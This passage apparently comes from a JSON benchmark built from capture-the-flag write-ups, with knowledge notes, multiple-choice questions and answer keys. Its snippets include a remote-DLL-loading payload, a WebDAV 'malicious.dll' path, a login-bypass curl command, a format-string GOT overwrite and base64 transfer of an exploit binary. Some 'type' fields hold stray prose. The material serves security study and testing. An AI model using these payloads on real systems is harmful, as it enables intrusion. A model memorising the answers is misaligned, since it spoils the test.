            "In a scenario where an attacker is exploiting a Windows system by overrunning an input buffer, which of the following payloads would properly trigger an application to attempt loading a Dynamic Link Library (DLL) from a network share, thereby achieving Remote Code Execution (RCE)? - A. `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe` - B. `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\localhost\\c$\\windows\\system32` - C. `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\\\live.sysinternals.com\\tools\\yourdll.dll` - D. `'OR 1=1; DROP TABLE users; --` ",
            "Given a block on SMB ports by ISPs or hosting providers, which approach can be taken to host a malicious DLL for exploitation purposes, especially when exploiting a Windows system through WebDAV? - A. Hosting the DLL on an FTP server and using an FTP path in the exploit. - B. Using the SMTP protocol to send the DLL as an email attachment to the target system. - C. Configuring an NTP server to serve the DLL file when requested. - D. Setting up a WebDAV share and using a path like `\\\\1.2.3.4@8080\\data\\malicious.dll` in the exploit. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Log 'em All",
        "write_up": "dataset/raw/Log 'em All.md",
        "type": "reverse",
        "competition": [
            "BSidesSF/2021",
            "https://ctftime.org/event/1299/tasks/"
        ],
        "score": 967,
        "max_score": 967,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving a game or application where objects are dynamically allocated and freed, a `use-after-free` vulnerability can appear when an object's memory is freed but references to that object are still used within the program. This can often be exploited by interacting with the game or application in a way that causes a new object to be allocated at the memory location of the freed object, allowing an attacker to control the data of the newly allocated object. In the given context, this was exploited by defeating an Asciimon, choosing to replace the current Asciimon with the defeated one, and then engaging in another fight with the same Asciimon, which had been freed but was still referenced, leading to a use-after-free condition.",
            "For exploiting a `use-after-free` vulnerability effectively, especially in scenarios where the memory layout and object sizes are predictable (e.g., objects are consistently `0x40` bytes in size), it is possible to control the overwritten data by causing an object of the same size to be allocated in the freed object's memory space. By renaming a character or object (in this case, through the official Name Rater) after triggering the vulnerability, an attacker can overwrite critical function pointers or data structures with controlled values. The attacker needs to ensure that the new data (e.g., the new name) is of a specific length or format to exploit the application correctly. This technique allows for arbitrary code execution or manipulation of the application's state in a beneficial manner to the attacker."
        ],
        "question": [
            "In a scenario where a game application allows a player to replace their current Asciimon with one they just won over, triggering a `use-after-free` vulnerability could occur. Assuming the application does not properly manage memory allocations and deallocations, which action could lead to exploiting this vulnerability? - A. Winning a battle and refusing to swap Asciimons - B. Swapping Asciimons and then encountering, fighting, and winning against the same Asciimon again - C. Restarting the game without saving progress - D. Saving the game immediately after winning a battle",
            "In an application with predictable memory layout and object sizes (each object is `0x40` bytes), how could an attacker exploit a `use-after-free` vulnerability after it has been triggered by specific actions within the game? - A. Changing the game's difficulty settings to influence memory allocation patterns - B. Interacting with an in-game character to rename an object, filling the vulnerable freed object space with attacker-controlled data - C. Deleting game files from the application directory to force re-allocation of memory - D. Performing in-game actions that do not influence memory allocation or free operations, such as viewing the game's credits"
        ],
        "answer": [
            "B. Swapping Asciimons and then encountering, fighting, and winning against the same Asciimon again",
            "B. Interacting with an in-game character to rename an object, filling the vulnerable freed object space with attacker-controlled data"
        ]
    },
    {
        "name": "log log log",
        "write_up": "dataset/raw/log log log.md",
        "type": "crypto",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 110,
        "max_score": 250,
        "difficulty": 0.44,
        "knowledge": [
            "When dealing with a Discrete Logarithm Problem (DLP) where the target is to find 'e' and only the least significant bits of 'e' are required for obtaining the flag, and it is known that 'e' is reduced modulo a power of 2 (in this case, \\(2^{1024}\\)), applying the Pohlig-Hellman algorithm specifically for the prime power factor (here, \\(2^{1024}\\)) can be an efficient approach due to its feasibility in computation. This approach significantly reduces complexity and is particularly useful when 'e' modulo a power of 2 is sufficient for recovering the flag.",
            "In scenarios where the modulus 'p' in a cryptographic challenge is designed as a large prime number satisfying a relation like \\(p = q \\cdot 2^{n} + 1\\) (where 'q' and 'n' are known), and the order of the group is \\(p - 1\\) which includes a large prime \\(q\\) and a high power of 2, focusing on the factor of \\(2^{n}\\) (if relevant to the challenge's goal) simplifies the problem. This simplification is especially relevant if the challenge involves solving for a value 'e' where only a certain number of least significant bits are needed. This strategy leverages the knowledge of the factorization of \\(p - 1\\) to efficiently solve for portions of 'e', making it practical to handle otherwise intractable problems."
        ],
        "question": [
            "In a cryptographic challenge involving the Discrete Logarithm Problem (DLP) where the goal is to recover only the least significant bits of a secret exponent 'e', and given that 'e' operates under a modulo of a power of 2, which algorithm optimizes the computation for this specific scenario, considering the efficiency and computational feasibility? - A. Baby-step giant-step algorithm - B. General Number Field Sieve - C. RSA algorithm - D. Pohlig-Hellman algorithm for prime-power order",
            "Given a cryptographic setup where the modulus 'p' is a large prime of the form \\(p = q \\cdot 2^{1024} + 1\\), with both 'q' and \\(2^{1024}\\) being factors of \\(p - 1\\), which strategy is essential for solving for a value 'e' when the challenge is focused on recovering only a specific number of least significant bits of 'e'? - A. Factoring the entire 'p - 1' to apply general DLP solving algorithms - B. Applying Elliptic Curve Cryptography for modulus factorization - C. Focusing on the factor \\(2^{1024}\\) relevant to the least significant bits of 'e' - D. Using quantum computing algorithms to directly compute 'e'"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "log-me-in",
        "write_up": "dataset/raw/log-me-in.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 87,
        "max_score": 474,
        "difficulty": 0.18354430379746836,
        "knowledge": [
            "In challenges where SQL injection is mitigated through prepared statements but the application accepts complex data types (like arrays or objects) due to the use of bodyParser with `extended: true` in Express.js applications, manipulating the input format to pass an object where a string is expected can lead to unexpected and exploitable query behavior. This technique exploits the way MySQL handles type casting and comparison, enabling bypass of authentication mechanisms when the password check is implemented insecurely.  \nExample payload: `csrf&username=michelle&password[username]=michelle`",
            "When exploiting web applications that employ session cookies for state management, after successfully injecting or bypassing authentication mechanisms, the session cookies can be used to maintain access or escalate privileges within the application. Tools like curl or scripting languages such as Python with libraries like `requests` can be used to automate the extraction of sensitive information (like a flag) from authenticated sessions.  \nExample command: `curl -i -X POST --data 'csrf&username=michelle&password[username]=michelle' \"https://log-me-in.web.ctfcompetition.com/login\"`  \nExample Python snippet:\n```python\nimport requests  \nurl = 'https://log-me-in.web.ctfcompetition.com/login'\npayload = {\n   \"username\": \"michelle\",  \n   \"password[username]\": \"michelle\",  \n   \"csrf\": \"\",  \n}\ns = requests.Session()\ns.post(url, data=payload)\nresponse = s.get('https://log-me-in.web.ctfcompetition.com/flag')\nprint(response.text)\n```"
        ],
        "question": [
            "In an Express.js application with `bodyParser` configured as `urlencoded({extended: true})`, how can you bypass a login mechanism that uses a MySQL database for authentication if the application does not properly handle input types for username and password fields? - A. Pass a JSON object in the username field to alter the SQL query structure. - B. Use an array as the password parameter to trigger automatic type conversion in MySQL, where 'password'={username:'michelle'}. - C. Inject SQL code directly into the username field without modifying the data type. - D. Modify the request headers to include SQL commands.",
            "After bypassing authentication on a web application using a specific payload to manipulate input data types, which method allows an attacker to maintain access or exploit further using session cookies? - A. Use the `document.cookie` JavaScript property to extract session cookies directly from the victim's browser. - B. Perform a cross-site scripting (XSS) attack to steal session cookies from authenticated users. - C. Utilize tools like curl or scripting languages with HTTP request capabilities, such as Python's `requests` library, to reuse session cookies for subsequent requests. - D. Decrypt the session cookie using a common hashing algorithm like MD5 to reveal the session ID."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "logbook",
        "write_up": "dataset/raw/logbook.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": 200,
        "max_score": 1000,
        "difficulty": 0.2,
        "knowledge": [
            "In a challenge involving a binary with format string vulnerabilities, if the binary has partial RELRO (Relocation Read-Only) protection, it is possible to perform a GOT (Global Offset Table) overwrite attack to redirect the execution flow. To successfully exploit the format string vulnerability, one can use tools like pwntools to automate the exploitation process, including crafting payloads that modify the GOT entries.\n   \n    - Condition: Applicable when exploiting format string vulnerabilities in binaries with partial RELRO protection.\n    - Knowledge: Utilize pwntools' `fmtstr_payload` function to generate a payload that overwrites a specific GOT entry with the desired function address to hijack the execution flow.\n    - Example payload creation: `payload = fmtstr_payload(offset, {elf.got.strncmp: elf.symbols['print_flag']})`",
            "When choosing a function in the GOT to overwrite during a format string exploit in a binary, consider the function's invocation timing and any potential obstacles like terminating bytes that could impact payload delivery (e.g., space character treated as input termination by `scanf`).\n   \n    - Condition: Effective when planning a GOT overwrite attack where direct interaction with input functions, such as `scanf`, limits the payload.\n    - Knowledge: Select a function's GOT entry for overwriting based on the absence of problematic bytes within its address and ensure the function's call occurs post-exploitation without previous invocations to prevent disruptions in program execution.\n    - Example strategy: Choosing `strncmp`'s GOT entry for overwrite instead of `putchar` to avoid the space character issue in address and ensure function gets called after exploit without prior calls disrupting program flow."
        ],
        "question": [
            "In a format string vulnerability scenario where the binary has partial RELRO protection, which of the following statements correctly describes a step to exploit this vulnerability using pwntools?  - A. Use the `fmtstr_payload` function from pwntools to send a non-malicious data packet to test the server's response time. - B. Create a simple script to crash the application, demonstrating that the vulnerability can be exploited. - C. Execute `fmtstr_payload` with an offset and a dictionary mapping the target GOT entry to a new address, to hijack the execution flow. - D. Manually calculate the necessary padding to create a buffer overflow, bypassing the need for any external tools. ",
            "When performing a format string exploit and deciding on a GOT entry to overwrite, why might an attacker choose `strncmp`'s GOT entry over `putchar`?  - A. The `strncmp` function's GOT entry address does not contain problematic bytes, unlike `putchar`, whose address could be terminated early by certain characters. - B. The `strncmp` function is more commonly used in applications, making it a more reliable target for overwriting. - C. Overwriting the GOT entry for `putchar` is more complex, requiring advanced knowledge of assembly language. - D. The `strncmp` function can be called multiple times without affecting the exploit, whereas `putchar` can only be used once. "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Logger",
        "write_up": "dataset/raw/Logger.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing `.pcap` files in cybersecurity investigations or CTF challenges, especially when dealing with network traffic data, it is crucial to examine HTTP packets for sensitive information such as login credentials (e.g., `POST` requests to login endpoints). Additionally, exploring JavaScript files fetched by the client can reveal custom hashing mechanisms or other client-side security measures. Using Wireshark or similar tools is essential for these activities.",
            "In scenarios involving custom encoding or encryption mechanisms (e.g., WebSocket communication in CTF challenges), reverse engineering the encoding or encryption logic is pivotal. Often, these custom mechanisms can be brute-forced or reversed given enough understanding of the algorithm\u2019s structure and output. For the given challenge, the attacker's keylogger encoded keystrokes before transmission over WebSockets; knowing the encoding method and keys allowed for decoding the intercepted data to retrieve the user's input. Implementing reverse engineering on JavaScript can be approached by analyzing and replicating the function logic, as demonstrated with the `encode` function and the paired `decode` process.\n\nExample of a decoding function basing on observed characteristics of the encoding algorithm:\n```javascript\nfunction decode(encoded_str, key) {\n    let decoded_arr = encoded_str.split(\"\").map(x => key.indexOf(x)).reverse();\n    let result = \"\";\n    // Assuming `helper` is a function to decode characters based on `decode` logic\n    decoded_arr.forEach(encoded_char => {\n        result += helper(encoded_char, key);\n    });\n    return result;\n}\n```\n\nThis function is a simplified conceptual approach and needs the actual decoding logic (`helper` function) to reverse the encoding process accurately."
        ],
        "question": [
            "In the context of analyzing packet capture (.pcap) files for security investigations, which tool is essential for examining HTTP packets and possible JavaScript files involved in web traffic, especially when identifying sensitive information like login credentials? - A. Photoshop - B. Microsoft Excel - C. Wireshark - D. Adobe Illustrator",
            "Given a custom encoding mechanism used for WebSocket communication in a cybersecurity challenge, which approach is necessary for successful reverse engineering to decode encrypted or obfuscated data? - A. Simply guessing the encoded messages without analysis - B. Sending an email request to the encoder for the decryption key - C. Analyzing and replicating the function logic to develop a corresponding decoding process - D. Ignoring the custom mechanism and focusing only on standard encryption techniques"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Looking Inwards",
        "write_up": "dataset/raw/Looking Inwards.md",
        "type": "web",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 300,
        "max_score": 550,
        "difficulty": 0.5454545454545454,
        "knowledge": [
            "In GraphQL API CTF challenges, one can utilize introspection queries to discover hidden or undocumented endpoints and their schemas, including types, queries, mutations, and subscriptions. This is particularly effective when documentation is lacking or when exploring the API for vulnerabilities. Example introspection query snippet:\n```  \n{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\n```",
            "After identifying a hidden or specific endpoint through introspection in a GraphQL API, construct a query to exploit or interact with that endpoint based on its expected arguments and return types. In scenarios where an endpoint expects a boolean to grant access (e.g., an \"authorized\" argument), directly setting this argument to `true` in the query may bypass security controls and reveal sensitive information or the flag. Example query for exploiting a discovered endpoint:\n```  \nquery {  \n   super_super_secret_flag_dispenser(authorized: true)  \n}\n```"
        ],
        "question": [
            "In the context of identifying hidden or specific endpoints in a GraphQL API when documentation is lacking, which type of query is utilized to expose the API schema, including details about its types, queries, mutations, and subscriptions?  - A. Mutation JSON query - B. Simple HTTP GET request - C. Introspection query - D. Direct access query ",
            "When attempting to interact with a discovered endpoint in a GraphQL API that expects a boolean `authorized` argument to grant access, what approach should be taken in the query to potentially bypass security controls and access sensitive information?  - A. Avoid using boolean values and insert a string instead - B. Set the `authorized` argument to `false` and expect a bypass - C. Omit the `authorized` argument from the query entirely - D. Set the `authorized` argument to `true` directly in the query "
        ],
        "answer": [
            "C. Introspection query",
            "D. Set the `authorized` argument to `true` directly in the query"
        ]
    },
    {
        "name": "Lord Saturday",
        "write_up": "dataset/raw/Lord Saturday.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 286,
        "max_score": 299,
        "difficulty": 0.9565217391304348,
        "knowledge": [
            "When facing restrictions on executing certain binaries due to missing files or permissions, creating a symbolic link (symlink) to another binary with similar capabilities can bypass this restriction. This approach is especially useful in scenarios where the behavior of the linked binary changes based on the value of `argv[0]`. For instance, replicating a missing `/usr/bin/sudoedit` by creating a symlink to `/usr/bin/sudo` can retain `sudoedit` functionality. This technique can be applied universally in scenarios where the binary's behavior is flexible based on its invocation name.\n    - Example command to create symlink: `ln -s /usr/bin/sudo /home/ctf/sudoedit`",
            "In environments where internet access is restricted or certain utility programs like `curl`, `wget`, or `nc` are unavailable, transferring files (e.g., exploit binaries) can be accomplished via encoding and manual transmission. First, encode the binary file with `base64` on a local system. Then, on the target system, decode it using `base64 -d`. This process allows for the manual transfer of files even when direct file transfer mechanisms are blocked. Compiling the exploit in the same environment as the target (e.g., a Docker image) ensures compatibility, particularly with complex libraries like libc.\n    - Example command to encode and transmit a file manually:\n        - Local system: `base64 exploit_binary > exploit_base64.txt`\n        - Remote system: `cat exploit_base64.txt | base64 -d > exploit_binary`"
        ],
        "question": [
            "In an environment where the `/usr/bin/sudoedit` binary is missing and you need its functionality, which of the following commands correctly creates a workaround by utilizing symbolic links (symlinks)? - A. `cp /usr/bin/sudo /home/ctf/sudoedit` - B. `ln -s /usr/bin/sudo /home/user/sudoedit` - C. `ln -s /usr/bin/sudo /home/ctf/sudoedit` - D. `mv /usr/bin/sudo /home/ctf/sudoedit`",
            "If you need to transfer an exploit binary to a remote system without internet access or utility programs (`curl`, `wget`, or `nc`), which of the following sequences of commands is the appropriate approach to manually transfer and properly execute the binary on the target system? - A. `gzip exploit_binary > exploit_compressed.txt` on local system, then `cat exploit_compressed.txt | gzip -d > exploit_binary` on remote system - B. `base64 exploit_binary > exploit_base64.txt` on local system, then `cat exploit_base64.txt | gzip -d > exploit_binary` on remote system - C. `tar -czvf exploit_binary.tar.gz exploit_binary` on local system, then `tar -xzvf exploit_binary.tar.gz` on remote system - D. `base64 exploit_binary > exploit_base64.txt` on local system, then `cat exploit_base64.txt | base64 -d > exploit_binary` on remote system"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Lost In Transmission 2",
        "write_up": "dataset/raw/Lost In Transmission 2.0.md",
        "type": "misc",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": -1.0,
        "max_score": 625,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving encrypted or coded messages, it is crucial to identify patterns within the data for decoding. If a sequence appears repeatedly, it could act as a delimiter or a key indicator of how the data was encoded. After identifying a repeating pattern, separating the data using this pattern may reveal encoded information in a recognizable format, such as Morse code or, as in this case, another encoding scheme named \"Bain\".",
            "When encountering data that resembles a known encoding format (like Morse code) after initial translation or substitution, but does not decode into intelligible text, consider the possibility of an alternative encoding scheme or cipher being used. In situations where Morse code or similar does not yield results, exploring other encoding schemes, including less common or bespoke ones (Bain in this scenario), may be necessary to decrypt the message and find the flag."
        ],
        "question": [
            "In a CTF challenge, you encounter a long string of 'F's and 'D's that doesn't immediately reveal its meaning. After identifying `--..-.` as a repeating pattern within the data, which of the following steps should be the next in attempting to decode the message? - A. Replace all `F`s with `.` and all `D`s with `-`, then use the identified pattern as a delimiter. - B. Convert the entire string directly to ASCII without identifying or using any delimiters. - C. Ignore the pattern and attempt to apply a Caesar cipher decryption on the string. - D. Directly translate the string into binary, assuming 'F' represents 1 and 'D' represents 0.",
            "When you translate an encrypted message assuming it is in Morse code, but it results in a nonsensical output, which of the following actions should you consider next in your decoding effort? - A. Stick with Morse code and try to find another hidden layer of encryption within the Morse. - B. Re-examine the message for patterns that might indicate the use of a different encoding scheme, such as Bain, especially when Morse code doesn\u2019t make sense. - C. Increase the complexity of your Morse code decryption by adding more spaces randomly. - D. Convert the Morse-like code directly into hexadecimal, assuming it will reveal the plaintext message."
        ],
        "answer": [
            "A.",
            "B."
        ]
    },
    {
        "name": "Lost Modulus",
        "write_up": "dataset/raw/Lost Modulus.md",
        "type": "crypto",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To recover the public key modulus (`n`) in an encryption system without knowing the public key, utilize an encryption-decryption oracle. Begin by encrypting a large number and decrypt it; if the result is truncated (i.e., modulo `n` operation occurs), it indicates that the encrypted number is greater than `n`. This method can systematically identify the maximum value of `n`, bit by bit, starting from the most significant bit. This approach is especially effective in scenarios where only a limited number of oracle interactions are permitted. A practical implementation involves encrypting powers of two decremented from a high bit size until a change in the decrypted output is observed, signifying the upper limit for `n`.\n\n```python\n# Example for iterating over bits to find the highest set bit of n\nfor bit in range(bitsize - 1, -1, -1):\n    payload = 2 ** bit\n    e = encrypt(long_to_bytes(payload))\n    result = decrypt(e)\n    if result != '00':  # Change detected, indicating upper bound for n\n        start_bit = bit\n        break\n```",
            "Paillier cryptosystem's homomorphic properties can be exploited to recover encrypted messages byte-by-byte. Given the Paillier cryptosystem's nature, one can perform operations on ciphertexts that directly translate to operations on the plaintexts. For example, to shift the decrypted message and recover it byte by byte, you can manipulate the ciphertext by subtracting the value of the last byte (making the plaintext end with `\\x00`) and divide the value by 256 (effectively shifting the plaintext). This process relies on manipulating ciphertext using operations allowed by Paillier's homomorphism, such as multiplication by a constant (to achieve division in plaintext) and adding or subtracting a value from the plaintext.\n\n```python\n# Example of shifting the decrypted message to recover it byte by byte\ndivisor = modinv(256, n)  # Modular inverse for division operation\nfor i in range(length_of_message):  \n    last_byte = decrypt(encrypted_message)  # decrypt to get last byte\n    modified_message = (encrypted_message * paillier_encrypt(n - ord(last_byte), n) % (n**2)\n    encrypted_message = pow(modified_message, divisor, n**2)  # shift message\n```"
        ],
        "question": [
            "In an encryption system where the public key modulus `n` is unknown, an encryption-decryption oracle is used to determine `n` by iteratively encrypting and decrypting progressively smaller numbers. Which of the following best describes the initial step in finding the most significant bit of `n`? - A. Encrypt and decrypt a small number, and increase the size until the decryption changes. - B. Start with encrypting and decrypting the number 1, and double it until decryption no longer returns 0. - C. Encrypt and decrypt `2**1024`, decrementing the power of 2 until the decryption output changes, indicating the upper limit for `n`. - D. Encrypt a random number and decrypt it; use the result to estimate `n` directly without iterative testing. ",
            "When using the Paillier cryptosystem's homomorphic properties to shift a ciphertext's decrypted message and recover it byte-by-byte, what operation is performed to adjust the ciphertext for recovering the next byte? - A. Multiply the ciphertext by the modular inverse of 2 raised to the power of 256 modulo `n`. - B. Subtract the last byte from the ciphertext and divide by 256 to shift the decrypted message. - C. Multiply the ciphertext by a value, then use the modular inverse of 256 modulo `n` to perform the equivalent of division on the plaintext. - D. Add the value of the last byte to the ciphertext and then multiply by 256 to shift the decrypted message. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "LovR",
        "write_up": "dataset/raw/LovR.md",
        "type": "misc",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 454,
        "max_score": 482,
        "difficulty": 0.941908713692946,
        "knowledge": [
            "In a challenge involving games or applications where progression is tracked through in-game variables (such as levels, points, or time limits), Cheat Engine can be effectively used to manipulate these variables to bypass limitations or reach certain game states. To do this, identify and scan for the in-game variable (like a score or level) using Cheat Engine, adjusting the scan type based on the variable's data type (e.g., Double, Integer). After finding the correct address, modify its value to achieve the desired effect, such as progressing to the next level or unlocking features. This approach requires trial and error to identify the correct data type and value.",
            "In challenges where clues or flags are hidden within rapidly changing or obscured visual elements, extracting and analyzing these visual clues can be achieved through recording the screen and using image processing techniques. Specifically, if a piece of information is displayed across two frames or images with a noisy background, capturing before and after frames and applying the XOR operation between these images can reveal the obscured text or clue. This technique leverages the principle that XORing two images can cancel out common elements (like a static background), highlighting differences (such as the appearance of text). This approach can be used to decipher hidden messages or clues in a variety of CTF challenges involving visual data manipulation.\n\nSample of payload for knowledge extraction in point 2 (XOR process) cannot be directly provided due to the nature of the operation requiring specific image data."
        ],
        "question": [
            "When using Cheat Engine to manipulate in-game variables in a game like reaching a specific level, what should be the first step in adjusting the game's state to your advantage? - A. Restart the game and use the in-game console to change variables. - B. Identify and scan for the specific in-game variable (e.g., level, points) using Cheat Engine, adjusting the scan type based on the variable's data type. - C. Use a hexadecimal editor to directly modify the game\u2019s executable file. - D. Create a mod for the game that automatically unlocks all levels. ",
            "In scenarios where visual clues are obscured by noise and rapidly changing, which technique is effective in revealing hidden text or clues within these elements? - A. Use a strong filter in a photo editing software to reduce the noise. - B. Print out the images and compare them side by side. - C. Record the screen and use the XOR operation on before and after frames to cancel out common elements and highlight differences. - D. Magnify the images and look for subtle color changes. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Lucky Numbers",
        "write_up": "dataset/raw/Lucky Numbers.md",
        "type": "This CTF challenge falls under the category of \"crypto\".",
        "competition": [
            "Hack.lu/2023",
            "https://ctftime.org/event/1921/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When a challenge involves numeric constraints and mathematical operations, rather than attempting to solve the constraints or operations manually, automate the process by writing a script that tries all possible valid combinations within given constraints. For example, if given a range for a variable, use a for-loop to iterate through all possible values within this range to find valid ones.  \nExample Payload:  \n```python\nfor t in range(43):  \n   n=2**t-1  \n   sent=False  \n   for i in range(2,int(n**0.5)+1):  \n       if (n%i) == 0:  \n           sent = True  \n           break  \n   if not sent:  \n       print(f\"{t}: Worked!\")  \n```",
            "In scenarios involving finding specific pairs of numbers that satisfy both a mathematical relation and a property (like being a \"lucky number\"), if one of the variables is solved or constrained by previous operations (e.g., finding valid `t` values based on a mathematical condition), iterate over the solved set of values to calculate and validate the pairs. This reduces the problem complexity significantly, allowing for a more direct solution by reusing the structure of the challenge's own logic.  \nExample Payload:  \n```python\nts = [1, 2, 3, 5, 7, 13, 17, 19, 31]  \nfor t in ts:  \n   A = []  \n   u=t-1  \n   number=(2**u)*(2**(t)-1)  \n   s = number  \n   sqrt_num=math.isqrt(s)  \n   for i in range(1,sqrt_num+1):  \n       if s%i==0:  \n           A.append(i)  \n           if i!=s//i and s//i!=s:  \n               A.append(s//i)        \n   total=sum(A)  \n   if total==s==number:  \n       print(f\"t - {t}, s - {s}: solved!\")  \n```"
        ],
        "question": [
            "In a scenario where you want to automatically identify numbers that satisfy certain conditions without manually checking each possibility, what approach should you employ when the solution space is explicitly defined within ranges? - A. Manually test a few numbers in the range to see if they meet the conditions. - B. Use a mathematical formula to directly calculate the valid numbers without checking each. - C. Write a script to iterate through all possible values within the given range, performing necessary checks to identify valid ones. - D. Guess the number that seems most likely to work based on intuition.",
            "When faced with the task of finding pairs of numbers that satisfy a specific mathematical relationship, and one of the variables is already determined, what is the next logical step in simplifying the problem to find these pairs efficiently? - A. Randomly choose values for the remaining variable until a working pair is found. - B. Iterate over the set of predetermined values for one variable, calculating and validating pairs using the given formula or conditions. - C. Ignore the predetermined values and focus on finding a general mathematical solution that applies to all possible pairs. - D. Consult a mathematical textbook to find a formula that links the two variables in such a way that the solution can be derived without any computation."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "lunch-with-the-cia",
        "write_up": "dataset/raw/lunch-with-the-cia.md",
        "type": "This write-up describes a dynamic programming approach for solving a problem involving repeatedly cutting a bar of chocolate into specific shapes with minimal waste. The given solution involves computing all possible cutting heights and widths, then iteratively finding the best solution for subpieces using memoization.\n\nBased on the content provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 491,
        "max_score": 493,
        "difficulty": 0.9959432048681541,
        "knowledge": [
            "In optimization challenges, especially those involving minimizing waste or maximizing some value within constraints, Dynamic Programming (DP) is a powerful approach to avoid recomputation of solutions for subproblems. Memoization is a specific technique used in DP to store the results of expensive function calls and return the cached result when the same inputs occur again. This makes DP particularly useful in problems where the solution to a problem depends on solutions to smaller subproblems.",
            "For challenges involving combinatorial optimization, such as cutting objects (e.g., chocolate bars) into smaller parts with specific constraints (like minimizing waste while ensuring the resultant pieces match given dimensions), a precomputation strategy to identify all valid cut dimensions beforehand can dramatically reduce the complexity of the solution space. This involves marking feasible cut dimensions based on the input constraints and then iterating through these dimensions to find an optimal solution for dividing the object into the desired forms.\n   \n    Example of precomputing valid dimensions (pseudocode):\n    ```\n    // psuedocode for finding all valid cut heights\n    valid_cut_heights = array of Boolean initialized to false with length = total_height + 1\n    valid_cut_heights[0] = true  // base case: no height is a valid cut\n    \n    for each rectangle_height in given_rectangles:\n        for i from 0 to max_height - rectangle_height:\n            if valid_cut_heights[i] is true:\n                valid_cut_heights[i + rectangle_height] = true\n    ```\n    \n    The above pseudo code captures the essence of marking heights that can be achieved by summing the heights of the given rectangles, thereby identifying all heights at which a cut could be made without wasting material outside the constraints of the given shapes."
        ],
        "question": [
            "In a challenge to minimize waste when cutting a chocolate bar, which technique is employed to ensure repeated computations for identical pieces are avoided, thereby optimizing the solution process? - A. Iterative enhancement - B. Greedy algorithms - C. Memoization in Dynamic Programming - D. Pure brute-force search",
            "When solving a problem to cut a chocolate bar into pieces with specific dimensions while minimizing waste, what precomputation step is critical to efficiently reduce the solution space and aid in finding an optimal solution? - A. Sorting all given rectangular dimensions by area - B. Calculating the total number of possible cuts without constraints - C. Marking all feasible cut dimensions based on the given rectangular dimensions - D. Estimating the waste for each cut before actual computation"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "MaaS",
        "write_up": "dataset/raw/MaaS.md",
        "type": "crypto",
        "competition": [
            "n00bzCTF/2023",
            "https://ctftime.org/event/1895/tasks/"
        ],
        "score": 410,
        "max_score": 498,
        "difficulty": 0.8232931726907631,
        "knowledge": [
            "When facing challenges involving modulo operations with input manipulation for guessing secret strings, identify if a constant input can be found that yields unique remainders when modulo is taken with all possible character ASCII values. This strategy allows for mapping of remainders to characters. If unique remainders can be obtained for all characters, this input can be used universally across multiple attempts to decipher the encoded message. Specifically, an approach to find such a constant involves iterating over a range of numbers and checking their modulo with possible character ASCII values to see if all remainders are unique. This is particularly useful in scenarios where input is left-shifted (or multiplied by a power of 2) before being modulo-ed with character ASCII values.\n   \n   Example payload approach: Iterate over a number range to find a constant `g` such that `(g << 16) % ord(character)` yields unique remainders for all characters in a given set (e.g., uppercase alphabet).",
            "In scenarios where a limited number of guesses can be made to identify secret strings encoded via modulo operations, leveraging multiple guesses to obtain a set of remainders for each character can establish uniqueness. This is based on the observation that each character can yield different remainders under the same operation but altered input conditions. This can circumvent potential collisions that may occur if relying on a single remainder per character approach. The knowledge of obtaining several outputs for the same character via different guesses allows for a more granular mapping from remainders to characters, thereby decoding messages more accurately in services or challenges that provide limited interaction opportunities.\n\n   Example application: Utilize the 3 guesses allowed per character to send different numbers and collect their modulo remainders when divided by each character's ASCII. Map these remainers back to the characters to figure out the secret string with higher precision compared to using a single remainder per character."
        ],
        "question": [
